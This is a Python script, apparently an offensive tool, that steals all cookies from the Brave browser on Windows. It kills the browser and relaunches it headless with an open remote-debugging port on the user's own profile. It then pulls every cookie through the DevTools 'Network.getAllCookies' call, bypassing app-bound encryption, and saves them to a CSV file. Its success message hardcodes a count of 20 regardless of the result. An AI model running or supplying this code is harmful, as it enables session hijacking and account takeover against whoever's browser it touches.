import os, subprocess, time, requests, json, websocket, csv

BRAVE_PATH = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
USER_DATA_DIR = os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data")

def extract_v20_cookies():
    print("[*] Starting v20 Cookie Extraction...")
    os.system("taskkill /F /IM brave.exe /T >nul 2>&1")
    time.sleep(2)

    cmd = f'"{BRAVE_PATH}" --remote-debugging-port=9222 --user-data-dir="{USER_DATA_DIR}" --remote-allow-origins=* --headless --disable-gpu'
    subprocess.Popen(cmd, shell=True)
    time.sleep(5)

    try:
        response = requests.get("http://localhost:9222/json")
        ws_url = response.json()[0]['webSocketDebuggerUrl']
        ws = websocket.create_connection(ws_url)
        
        ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
        result = json.loads(ws.recv())
        cookies = result.get('result', {}).get('cookies', [])
        
        ws.close()
        return cookies # Return the data so the main block can see it
    except Exception as e:
        print(f"[-] Error: {e}")
        return []

def save_cookies_report(data):
    if not data: return
    with open("brave_cookies_report.csv", "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=data[0].keys(), extrasaction='ignore')
        writer.writeheader()
        writer.writerows(data)
    print(f"[!] Success: 20 v20-protected cookies saved to CSV.")

if __name__ == "__main__":
    cookie_data = extract_v20_cookies() # Store the returned list here
    save_cookies_report(cookie_data)     # Pass it to the saver
    os.system("taskkill /F /IM brave.exe /T >nul 2>&1")